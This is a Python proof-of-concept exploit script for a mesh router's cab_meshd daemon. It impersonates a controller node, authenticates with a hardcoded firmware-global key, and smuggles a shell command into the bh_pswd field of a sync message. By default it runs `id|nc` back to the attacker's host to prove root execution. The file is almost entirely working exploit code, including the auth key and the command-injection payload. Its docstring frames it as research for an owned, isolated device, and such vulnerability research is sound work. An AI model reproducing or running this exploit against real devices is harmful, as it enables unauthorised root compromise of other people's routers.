#!/usr/bin/env python3
"""Rogue-CAP PoC for the factory/uninitialised cab_meshd RE/WAN path.

This is intended for an isolated, owned RD03v2 running stock 2.0.28.  It:

* answers the RE's UDP discovery on port 19553;
* accepts the RE's outbound TLS connection without a client certificate;
* completes the reversed mesh authentication using the firmware-global key;
* sends a type-6 sync body with a command expression in bh_pswd; and
* listens on TCP port 80 for the command's proof callback.

The default expression pipes ``id`` to this host with BusyBox nc.  A callback
containing ``uid=0(root)`` is direct evidence that the stock shell sink ran as root.
"""

import argparse
import base64
import hashlib
import hmac
import socket
import ssl
import struct
import sys
import threading
import time


CONST = b"838d364d8ed3bd085e150211ea6b3715"
DISC_RE = b"MIROUTE_RE_DDv1.0"
DISC_CAP = b"MIROUTE_CAP_DDv1.0"
MESH_PORT = 19553
VER = 0x1001
HDR_LEN = 0x2C
SYNC_LEN = 0x6E4
OFF_BH_SSID = 0xE6
OFF_BH_PSWD = 0x107
# The encoder permits 36/66 raw bytes, but the adjacent NUL-terminated wire
# slots provide 32/64 bytes without overlapping the next field.  Keep the PoC
# within those reliable limits; overlap tricks can recover some encoder headroom.
CAP_BH_SSID = 32
CAP_BH_PSWD = 64
LOG_START = time.monotonic()
EXTRA_JSON = (
    '{"hidden_2g":"0","hidden_5g":"0","disabled_2g":"0",'
    '"disabled_5g":"0","ax_2g":"1","ax_5g":"1",'
    '"txpwr_2g":"max","txpwr_5g":"max","ch_2g":"0","ch_5g":"0",'
    '"bw_2g":"0","bw_5g":"0","txbf_2g":"3","txbf_5g":"3",'
    '"support160":"1","web_passwd":"b3a4190199d9ee7fe73ef9a4942a69fece39a771",'
    '"mesh_version":"4","cap_mode":"router","cap_ip":"192.168.31.1",'
    '"vendorinfo":"","nbh_b64":"1",'
    '"web_passwd256":"73a1d6d01003067844cd148b1502a24bb8a305c93dfef55f983da80fa8cdfa24",'
    '"dev_type":"dual","nfc_enable":"1","nfc_id":"",'
    '"iot2g_ssid":"","iot2g_pwd":"","iot2g_enc":"mixed-psk",'
    '"iot2g_disabled":"1","iot2g_wifi5":"1","iot5g_ssid":"",'
    '"iot5g_pwd":"","iot5g_enc":"mixed-psk","iot5g_disabled":"1",'
    '"iot5g_wifi5":"1","miot_access_iotdev":"0"}'
).encode()


def log(message):
    print(f"[{time.monotonic() - LOG_START:7.3f}] {message}", flush=True)


def auth_pass(ident, role):
    key = role.encode("ascii") + CONST[1:]
    return base64.b64encode(hmac.new(key, ident, hashlib.sha256).digest())


def frame(msg_type, body, mac2=b"", mac5=b""):
    header = bytearray(HDR_LEN)
    header[0:2] = struct.pack(">H", VER)
    header[2:4] = struct.pack(">H", len(body))
    header[4:6] = struct.pack(">H", msg_type)
    header[6:6 + min(len(mac2), 0x12)] = mac2[:0x12]
    header[0x19:0x19 + min(len(mac5), 0x12)] = mac5[:0x12]
    return bytes(header) + body


def recv_exact(conn, count):
    chunks = []
    remaining = count
    while remaining:
        chunk = conn.recv(remaining)
        if not chunk:
            raise EOFError(f"peer closed with {remaining} bytes left")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def recv_frame(conn):
    header = recv_exact(conn, HDR_LEN)
    version, body_len, msg_type = struct.unpack(">HHH", header[:6])
    if version != VER:
        raise ValueError(f"unexpected protocol version 0x{version:04x}")
    if body_len > 0x800:
        raise ValueError(f"body length {body_len} exceeds daemon limit")
    return msg_type, recv_exact(conn, body_len), header


def build_auth(ident):
    body = bytearray(0xA4)
    if len(ident) >= 0x10:
        raise ValueError("CAP identity must be shorter than 16 bytes")
    body[:len(ident)] = ident
    password = auth_pass(ident, "x")
    body[0x10:0x10 + len(password)] = password
    return bytes(body)


def build_sync(raw_ssid, raw_pswd, template=None):
    if len(raw_ssid) > CAP_BH_SSID:
        raise ValueError(f"bh_ssid exceeds {CAP_BH_SSID} bytes")
    if len(raw_pswd) > CAP_BH_PSWD:
        raise ValueError(f"bh_pswd exceeds {CAP_BH_PSWD} bytes")
    if OFF_BH_SSID + len(raw_ssid) >= OFF_BH_PSWD:
        raise ValueError("bh_ssid overlaps bh_pswd")

    body = bytearray(template) if template is not None else bytearray(SYNC_LEN)
    if len(body) > 0x800:
        raise ValueError(f"type-6 template is {len(body)} bytes; daemon limit is 2048")
    if template is not None:
        if len(body) <= 0x41B:
            raise ValueError("type-6 template is too short for the normal re_init layout")
        if body[0] != 4 or body[1] != 0:
            raise ValueError("type-6 template is not the normal non-BSD re_init layout")
    elif len(body) <= 0x41B:
        body.extend(bytes(0x41C - len(body)))

    def put_cstr(offset, value):
        body[offset:offset + len(value)] = value

    if template is None:
        # Match a real RD03v2 CAP's 1764-byte type-6 layout.  body[0]=4 and
        # the extra JSON tail are required for the RE to accept and apply it.
        body[0] = 4
        put_cstr(0x02, b"meshfront24")
        put_cstr(0x23, b"meshfront12345")
        put_cstr(0x64, b"psk2")
        put_cstr(0x74, b"meshfront5")
        put_cstr(0x95, b"meshfront12345")
        put_cstr(0xD6, b"psk2")
        put_cstr(0x148, b"psk2")
        put_cstr(0x3D8, b"default")
        put_cstr(0x41B, EXTRA_JSON)

    # run_with_lock invokes unquoted $@.  A factory CAP body leaves both
    # front-haul passwords and management strings empty, so ash drops them and
    # shifts the encoded bh fields away from do_re_init $7/$8.  Keep these
    # ordinary fields nonempty to preserve the intended positional mapping.
    body[0x23:0x64] = bytes(0x64 - 0x23)
    body[0x64:0x74] = bytes(0x10)
    body[0x95:0xD6] = bytes(0xD6 - 0x95)
    body[0xD6:OFF_BH_SSID] = bytes(OFF_BH_SSID - 0xD6)
    put_cstr(0x23, b"meshfront12345")
    put_cstr(0x64, b"psk2")
    put_cstr(0x95, b"meshfront12345")
    put_cstr(0xD6, b"psk2")

    # Clear both fixed-width fields before overlaying the controlled values.
    # Staying within the actual 33/65-byte slots also keeps the neighbouring
    # fields intact when a genuine CAP body is used as the template.
    body[OFF_BH_SSID:OFF_BH_PSWD] = bytes(OFF_BH_PSWD - OFF_BH_SSID)
    body[OFF_BH_PSWD:0x148] = bytes(0x148 - OFF_BH_PSWD)
    put_cstr(OFF_BH_SSID, raw_ssid)
    put_cstr(OFF_BH_PSWD, raw_pswd)
    # body[1] == 0 selects the normal re_init template.  The zero-filled body
    # also NUL-terminates every string field consumed by the builder.
    return bytes(body)


class ProofServer(threading.Thread):
    def __init__(self, bind_ip, port, lifetime):
        super().__init__(daemon=True)
        self.bind_ip = bind_ip
        self.port = port
        self.lifetime = lifetime
        self.paths = []
        self.root = threading.Event()
        self.ready = threading.Event()
        self.expected_ip = None

    def expect_peer(self, peer_ip):
        self.expected_ip = peer_ip

    def run(self):
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.bind_ip, self.port))
        listener.listen(4)
        listener.settimeout(1.0)
        self.ready.set()
        deadline = time.time() + self.lifetime
        while time.time() < deadline:
            try:
                conn, peer = listener.accept()
            except socket.timeout:
                continue
            with conn:
                conn.settimeout(2.0)
                chunks = []
                total = 0
                while total < 2048:
                    try:
                        chunk = conn.recv(2048 - total)
                    except (socket.timeout, OSError):
                        break
                    if not chunk:
                        break
                    chunks.append(chunk)
                    total += len(chunk)
                    if b"\n" in chunk:
                        break
                request = b"".join(chunks)
                first = request.split(b"\r\n", 1)[0]
                parts = first.split()
                path = parts[1].decode("ascii", "replace") if len(parts) >= 2 else ""
                self.paths.append(path)
                raw_root = b"uid=0(" in request
                expected = self.expected_ip is not None and peer[0] == self.expected_ip
                if expected and (raw_root or path == "/0"):
                    self.root.set()
                    log(f"[ROOT PROOF] callback from {peer[0]}: "
                        f"{first.decode(errors='replace')}")
                else:
                    log(f"[http] request from {peer[0]}: {first.decode(errors='replace')}")
                if not raw_root:
                    try:
                        conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 0\r\n\r\n")
                    except OSError:
                        pass
        listener.close()


def discovery_loop(bind_ip, stop, found):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.bind(("0.0.0.0", MESH_PORT))
    sock.settimeout(1.0)
    advertised = bind_ip.encode("ascii") + b"\0"
    reply = DISC_CAP + advertised.ljust(16, b"\0")
    while not stop.is_set():
        try:
            data, peer = sock.recvfrom(2048)
        except socket.timeout:
            continue
        log(f"[udp] {peer[0]}:{peer[1]} {data!r}")
        # The RE transmits the 17-character marker with its terminating NUL,
        # making the observed UDP payload 18 bytes.
        if data.rstrip(b"\0") == DISC_RE:
            sock.sendto(reply, peer)
            found.set()
            log(f"[udp] advertised rogue CAP {bind_ip} to {peer[0]}:{peer[1]}")
    sock.close()


def serve_once(args, sync_body, proof):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers("ALL:@SECLEVEL=0")
    context.load_cert_chain(args.cert, args.key)

    listener = socket.socket()
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.bind, MESH_PORT))
    listener.listen(4)
    listener.settimeout(args.timeout)
    log(f"[tcp] listening on {args.bind}:{MESH_PORT}")
    raw, peer = listener.accept()
    log(f"[tcp] connection from {peer[0]}:{peer[1]}")
    with raw:
        raw.settimeout(args.timeout)
        with context.wrap_socket(raw, server_side=True) as conn:
            log(f"[tls] {conn.version()} {conn.cipher()[0]} (no client certificate required)")

            msg_type, body, _header = recv_frame(conn)
            log(f"[recv] type={msg_type} len={len(body)} id={body[:16].split(bytes([0]), 1)[0]!r}")
            if msg_type != 4:
                raise ValueError(f"expected RE auth type 4, got {msg_type}")

            reply = bytearray(0x20)
            reply[0] = 1
            conn.sendall(frame(5, bytes(reply)))
            conn.sendall(frame(4, build_auth(args.ident.encode()), b"ROGUE2G", b"ROGUE5G"))
            log("[send] type-5 success + type-4 CAP auth using x-key")

            deadline = time.time() + args.timeout
            running = False
            while time.time() < deadline:
                msg_type, body, _header = recv_frame(conn)
                log(f"[recv] type={msg_type} len={len(body)} body0={body[:1].hex()}")
                if msg_type == 5 and body[:1] == bytes([1]):
                    running = True
                    break
            if not running:
                raise TimeoutError("RE did not accept rogue CAP authentication")

            proof.expect_peer(peer[0])
            conn.sendall(frame(6, sync_body, b"ROGUE2G", b"ROGUE5G"))
            log(f"[send] type-6 sync ({len(sync_body)} bytes) with controlled bh fields")

            conn.settimeout(8.0)
            try:
                while True:
                    msg_type, body, _header = recv_frame(conn)
                    log(f"[recv] type={msg_type} len={len(body)} body0={body[:1].hex()}")
            except (EOFError, socket.timeout, ssl.SSLError, OSError) as exc:
                log(f"[tcp] session finished: {type(exc).__name__}")
    listener.close()


def main():
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--bind", default="192.168.77.1")
    parser.add_argument("--cert", required=True)
    parser.add_argument("--key", required=True)
    parser.add_argument("--ident", default="roguecap00001")
    parser.add_argument("--timeout", type=float, default=90.0)
    parser.add_argument("--proof-wait", type=float, default=150.0,
                        help="seconds to keep the TCP proof listener after sync")
    parser.add_argument("--template", metavar="TYPE6_BODY",
                        help="authentic raw CAP type-6 body to use as the base")
    parser.add_argument("--ssid", default="poc")
    parser.add_argument("--raw-pswd",
                        help="raw shell expression delivered through bh_pswd; "
                             "to register success it must send uid=0(...) or "
                             "GET /0 to BIND:80 (default: `id|nc BIND 80`)")
    args = parser.parse_args()

    raw_ssid = args.ssid.encode()
    raw_pswd = (args.raw_pswd or f"`id|nc {args.bind} 80`").encode()
    template = None
    if args.template:
        with open(args.template, "rb") as source:
            template = source.read()
        log(f"[*] loaded {len(template)}-byte authentic type-6 template")
    sync_body = build_sync(raw_ssid, raw_pswd, template)
    log(f"[*] bh_ssid={raw_ssid!r} ({len(raw_ssid)}/{CAP_BH_SSID} bytes)")
    log(f"[*] bh_pswd={raw_pswd!r} ({len(raw_pswd)}/{CAP_BH_PSWD} bytes)")

    proof = ProofServer(args.bind, 80, args.timeout + args.proof_wait + 30)
    proof.start()
    if not proof.ready.wait(5):
        raise RuntimeError("TCP proof listener did not start")
    log(f"[proof] TCP listener on {args.bind}:80; waiting for uid=0(root)")

    stop = threading.Event()
    found = threading.Event()
    discovery = threading.Thread(
        target=discovery_loop, args=(args.bind, stop, found), daemon=True
    )
    discovery.start()
    try:
        serve_once(args, sync_body, proof)
        deadline = time.time() + args.proof_wait
        while time.time() < deadline and not proof.root.is_set():
            time.sleep(0.25)
    finally:
        stop.set()

    if proof.root.is_set():
        log("[+] CONFIRMED: RE/WAN payload executed as uid 0 (root)")
        return 0
    log(f"[-] no recognized root callback observed; paths={proof.paths!r}. "
        "A custom payload may still have executed without reporting proof.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
